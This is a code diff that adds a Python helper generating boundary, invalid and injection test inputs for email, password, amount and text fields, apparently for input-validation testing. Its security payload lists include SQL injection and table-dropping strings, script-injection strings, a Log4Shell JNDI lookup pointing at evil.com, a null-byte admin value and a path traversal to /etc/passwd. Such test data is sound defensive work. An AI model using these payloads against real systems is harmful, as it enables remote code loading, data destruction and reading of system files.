@@ -75,3 +75,34 @@ def get_security_and_edge_cases(feature_category: str) -> dict:
         "category_matched": category,
         "mandatory_checks": selected
     }
+
+
+def generate_boundary_test_data(field_type: str) -> dict:
+    """Generates boundary, invalid, and injection test data payloads for a specific input field type (e.g., 'email', 'password', 'amount', 'text')."""
+    datasets = {
+        "email": {
+            "valid_boundary": ["a@b.co", "user+tag@sub.domain.com"],
+            "invalid_format": ["plainaddress", "@missinguser.com", "user@.com", "user@domain..com"],
+            "security_payloads": ["' OR 1=1--@test.com", "<script>alert(1)</script>@test.com"],
+            "edge_cases": ["", " ", "a" * 250 + "@test.com"]
+        },
+        "password": {
+            "valid_boundary": ["Ab1!5678", "P@ssw0rd!" * 8],
+            "invalid_format": ["1234567", "password", "PASSWORD123", "Pass1234"],
+            "security_payloads": ["' OR '1'='1", "${jndi:ldap://evil.com/a}", "\x00admin"],
+            "edge_cases": ["", "        ", "A" * 512]
+        },
+        "amount": {
+            "valid_boundary": [0.01, 1, 999999.99],
+            "invalid_format": [-1, -0.01, 0, "abc", "10.999"],
+            "security_payloads": ["99999999999999999999", "NaN", "Infinity"],
+            "edge_cases": [None, "", "0x10"]
+        },
+        "text": {
+            "valid_boundary": ["A", "Sample valid input 123"],
+            "invalid_format": ["\n\r\t", "   "],
+            "security_payloads": ["<img src=x onerror=alert(1)>", "'; DROP TABLE users;--", "../../etc/passwd"],
+            "edge_cases": ["", "X" * 10000, "🚀🔥💻"]
+        }
+    }
+    return datasets.get(field_type.lower(), datasets["text"])
